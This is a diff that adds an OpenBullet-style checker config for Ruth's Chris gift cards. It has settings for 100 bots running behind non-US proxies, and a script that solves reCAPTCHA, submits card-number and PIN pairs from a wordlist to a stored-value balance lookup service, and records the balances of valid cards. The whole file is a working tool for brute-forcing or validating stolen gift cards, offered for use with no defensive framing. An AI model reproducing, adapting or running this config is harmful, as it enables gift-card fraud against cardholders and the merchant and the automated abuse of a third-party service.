@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "RuthsChris",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-26T06:56:41.0811337+00:00",
+  "AdditionalInfo": "USE NON US PROXIES",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "CardPin",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://wbiprod.storedvalue.com/WBI/lookupservlet?language=en&host=ruthschris.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://wbiprod.storedvalue.com/WBI/lookupservlet?language=en&host=ruthschris.com" "6LckryETAAAAAPFZhVfos9Ays4NSWb_7POn1-Y-u" -> VAR "RECAP" 
+FUNCTION CurrentUnixTime "" -> VAR "TIME" 
+REQUEST POST "https://wbiprod.storedvalue.com/WBI/WBServlet" AutoRedirect=TRUE 
+  CONTENT "valueListCounter=3&0=N&1=19&2=16&resultPage=%2FclientPages%2FRCHKG_en_Results.jsp&lookUpPage=%2FclientPages%2FRCHKG_en_Lookup.jsp&errorPage=%2FclientPages%2FRCHKG_en_500.jsp&host=ruthschris.com&lowerTime=<TIME>&PinRequired=null&cardNoH=<USER>&PassedCaptchaNew=false&pinNoH=<PASS>&g-recaptcha-response=<RECAP>&submit.x=54&submit.y=16" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://wbiprod.storedvalue.com/WBI/lookupservlet?language=en&host=ruthschris.com" 
+  HEADER "Origin: https://wbiprod.storedvalue.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid" 
+  KEYCHAIN Success OR 
+    KEY ">Your balance is:<" 
+PARSE "<SOURCE>" LR "<font size=\"5\" color=\"#990000\"><b>" "<" Recursive=FALSE -> CAP "BALANCE" "" "" 
